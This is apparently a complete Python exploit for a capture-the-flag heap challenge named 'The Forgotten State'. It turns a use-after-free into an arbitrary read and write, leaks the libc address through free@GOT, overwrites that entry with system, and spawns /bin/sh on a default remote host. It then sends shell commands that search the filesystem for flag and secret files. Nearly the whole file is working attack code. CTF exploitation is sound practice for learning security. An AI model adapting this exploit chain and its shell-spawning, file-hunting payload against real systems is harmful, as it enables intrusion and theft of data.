#!/usr/bin/env python3
"""The Forgotten State CTF: UAF -> arbitrary read/write -> free@GOT = system."""
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.join(ROOT, 'peserta/state')
LD = os.path.join(ROOT, 'peserta/ld-linux-x86-64.so.2')
LIB = os.path.join(ROOT, 'peserta')
FREE_GOT = 0x404000
FREE_LIBC_OFFSET = 0xb5360
SYSTEM_LIBC_OFFSET = 0x5c2e0

def p64(x):
    return struct.pack('<Q',x)

def u64(x):
    return struct.unpack('<Q',x.ljust(8,b'\0'))[0]

class Link:
    def __init__(self, remote=False, host='s1.nfx.my.id', port=48645):
        self.remote = remote
        self.buf = bytearray()
        if remote:
            self.sock = socket.create_connection((host,port),timeout=5)
            self.sock.setblocking(False)
            self.fd = self.sock.fileno()
        else:
            self.proc = subprocess.Popen([LD,'--library-path',LIB,BINARY], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=ROOT, bufsize=0)
            self.fd = self.proc.stdout.fileno()
    def send(self, data):
        if self.remote: self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
    def line(self,x):
        if isinstance(x,(int,str)): x=str(x).encode()
        self.send(x+b'\n')
    def recvuntil(self,marker,timeout=8):
        end=time.monotonic()+timeout
        while True:
            pos=self.buf.find(marker)
            if pos>=0:
                value=bytes(self.buf[:pos+len(marker)])
                del self.buf[:pos+len(marker)]
                return value
            if time.monotonic()>end: raise TimeoutError(f'Timeout waiting for {marker!r} buf={self.buf[-400:]!r}')
            rd,_,_=select.select([self.fd],[],[],min(0.5,max(0,end-time.monotonic())))
            if rd:
                if self.remote:
                    try: data=self.sock.recv(4096)
                    except BlockingIOError: continue
                else: data=os.read(self.fd,4096)
                if not data: raise EOFError('disconnected before marker '+repr(marker)+' buf '+repr(self.buf[-300:]))
                self.buf.extend(data)
    def recvn(self,n):
        while len(self.buf)<n:
            rd,_,_=select.select([self.fd],[],[],8)
            if not rd: raise TimeoutError('recv timeout '+repr(self.buf))
            if self.remote:
                try:data=self.sock.recv(4096)
                except BlockingIOError:continue
            else:data=os.read(self.fd,4096)
            if not data: raise EOFError('recv EOF')
            self.buf.extend(data)
        out=bytes(self.buf[:n]);del self.buf[:n];return out
    def recvmore(self,seconds=1):
        end=time.monotonic()+seconds
        out=bytearray(self.buf);self.buf.clear()
        while time.monotonic()<end:
            rd,_,_=select.select([self.fd],[],[],min(.2,end-time.monotonic()))
            if rd:
                try:
                    data=self.sock.recv(4096) if self.remote else os.read(self.fd,4096)
                except BlockingIOError: continue
                if not data:break
                out.extend(data)
        return bytes(out)
    def close(self):
        try:self.sock.close() if self.remote else self.proc.terminate()
        except Exception:pass

def cmd(io,number):
    io.recvuntil(b'> ')
    io.line(number)

def create(io,idx,name,size,data):
    assert len(data)==size,(len(data),size)
    cmd(io,1)
    io.recvuntil(b'name : ')
    io.line(name)
    io.recvuntil(b'size : ')
    io.line(size)
    io.recvuntil(b'data : ')
    io.send(data)
    resp=io.recvuntil(b'dibuat')
    assert b'record #'+str(idx).encode() in resp,resp
    io.recvuntil(b'\n')
    print(f'[+] created record {idx}: name={name!r} size={size}',flush=True)

def release(io,idx):
    cmd(io,2)
    io.recvuntil(b'index : ')
    io.line(idx)
    resp=io.recvuntil(b'dilepas')
    io.recvuntil(b'\n')
    assert b'record #'+str(idx).encode() in resp,resp
    print(f'[+] released record {idx}',flush=True)

def view(io,idx,length):
    cmd(io,3)
    io.recvuntil(b'index : ')
    io.line(idx)
    io.recvuntil(b'data: ')
    leak=io.recvn(length)
    io.recvuntil(b'\n')
    return leak

def edit(io,idx,data):
    cmd(io,4)
    io.recvuntil(b'index : ')
    io.line(idx)
    io.recvuntil(b'new length : ')
    io.line(len(data))
    io.recvuntil(b'data : ')
    io.send(data)
    io.recvuntil(b'[+] record diperbarui.')
    io.recvuntil(b'\n')
    print(f'[+] edited record {idx} with {len(data)} bytes',flush=True)

def run(remote=False,host='s1.nfx.my.id',port=48645):
    io=Link(remote,host,port)
    try:
        # Two 0x30 header allocations; data has 0x50 tcache bin, distinct.
        create(io,0,b'AAAA',0x40,b'A'*0x40)
        create(io,1,b'BBBB',0x40,b'B'*0x40)
        release(io,0)
        release(io,1)
        # On create #2, header consumes header #1, data consumes freed header #0.
        # Since table[0] was left dangling, table[0]->data now points at GOT.
        fake_header=struct.pack('<16sIIQ',b'FAKE',8,1,FREE_GOT)
        create(io,2,b'CONTROL',len(fake_header),fake_header)
        leak=view(io,0,8)
        free_address=u64(leak)
        print(f'[+] GOT free()  = 0x{free_address:x} (raw={leak.hex()})',flush=True)
        if free_address & 0xfff != FREE_LIBC_OFFSET & 0xfff:
            raise ValueError('libc mismatch or wrong overlap; verify leak!')
        base=free_address-FREE_LIBC_OFFSET
        system=base+SYSTEM_LIBC_OFFSET
        print(f'[+] libc base   = 0x{base:x}',flush=True)
        print(f'[+] system()    = 0x{system:x}',flush=True)
        edit(io,0,p64(system))
        create(io,3,b'SHELL',0x20,b'/bin/sh\x00'.ljust(0x20,b'X'))
        print('[+] triggering system("/bin/sh") via release(3)',flush=True)
        # release will enter the shell before it prints the usual confirmation.
        cmd(io,2)
        io.recvuntil(b'index : ')
        io.line(3)
        shell_cmd = (
            'echo BEGIN_PWNED; id; pwd; ls -la; '
            'for f in ./flag ./flag.txt ./flag* /flag /flag.txt /flag* '
            '/app/flag* /home/ctf/flag* /home/chall/flag* /srv/flag*; '
            'do if [ -f "$f" ]; then echo "[FILE] $f"; cat "$f"; fi; done; '
            'echo "[SEARCH]"; find / -maxdepth 4 -type f '
            "\\( -iname '*flag*' -o -iname '*secret*' \\) "
            '2>/dev/null | head -60; '
            'echo END_PWNED; exit'
        )
        io.line(shell_cmd)
        out=io.recvmore(5)
        print('[+] result:\n'+out.decode('utf-8','replace'),flush=True)
        flags = re.findall(rb'NFX\{[^}\r\n]{1,160}\}',out)
        if flags:
            for flag in flags:
                print('[FLAG] '+flag.decode('utf-8','replace'),flush=True)
        else:
            print('[!] No NFX{...} flag found in the returned output; inspect [SEARCH] filenames and cat their contents.', flush=True)
        return out
    finally:
        io.close()

if __name__=='__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('--remote',action='store_true')
    parser.add_argument('--host',default='s1.nfx.my.id')
    parser.add_argument('--port',type=int,default=48645)
    args=parser.parse_args()
    run(args.remote,args.host,args.port)